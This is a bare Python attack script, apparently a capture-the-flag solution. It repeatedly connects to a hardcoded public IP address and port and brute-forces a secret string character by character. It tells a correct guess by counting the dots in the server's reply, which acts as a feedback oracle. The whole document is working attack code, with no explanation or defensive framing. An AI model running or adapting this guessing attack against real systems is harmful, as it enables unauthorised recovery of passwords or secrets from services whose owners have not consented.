#Script from Romain Jennes 
import socket
import time
import sys
server="3.248.160.188"
dstPort= 2554
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%&*-_"
myString = ""
notFound = True
counter = 1
maxduration = 0
duration = 0
theString=""

for i in range(10):
    for c in chars:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((server, dstPort))
        infoRecv = s.recv(1024).decode()
        s.send((theString+c).encode())
        s.recv(1024)
        info=s.recv(1024)

        if  info.split(b' ')[0][3:]==b'.'*(i+2):
            theString+=c
            print(theString)
            break

